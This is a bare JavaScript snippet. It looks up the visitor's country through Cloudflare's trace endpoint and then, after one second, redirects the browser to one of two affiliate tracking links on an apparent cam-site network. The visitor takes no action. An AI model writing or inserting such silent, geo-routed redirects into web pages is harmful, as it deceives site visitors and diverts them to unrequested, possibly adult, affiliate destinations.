var xRedir = 1000;
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var country_code = this.responseText.replace(/(\r\n|\n|\r)/gm,"").split('loc=');
country_code = country_code[1].split('tls=');
country_code = country_code[0];


if (country_code == "US"){

setTimeout('window.location.href = "https://t.camsk5.com/133199/223/0?aff_sub5=SF_006OG000004lmDN"', xRedir);

}

else if (country_code == "GB"){

setTimeout('window.location.href = "https://t.camsk5.com/133199/223/0?aff_sub5=SF_006OG000004lmDN"', xRedir);

}

else if (country_code == "AU"){

setTimeout('window.location.href = "https://t.camsk5.com/133199/223/0?aff_sub5=SF_006OG000004lmDN"', xRedir);

}

else if (country_code == "CA"){

setTimeout('window.location.href = "https://t.camsk5.com/133199/223/0?aff_sub5=SF_006OG000004lmDN"', xRedir);

}

//todosPais
else {

setTimeout('window.location.href = "https://t.camsk5.com/133199/1713/9832?aff_sub5=SF_006OG000004lmDN"', xRedir);

}

}
};

xhttp.open("GET", "https://www.cloudflare.com/cdn-cgi/trace", true);
xhttp.send();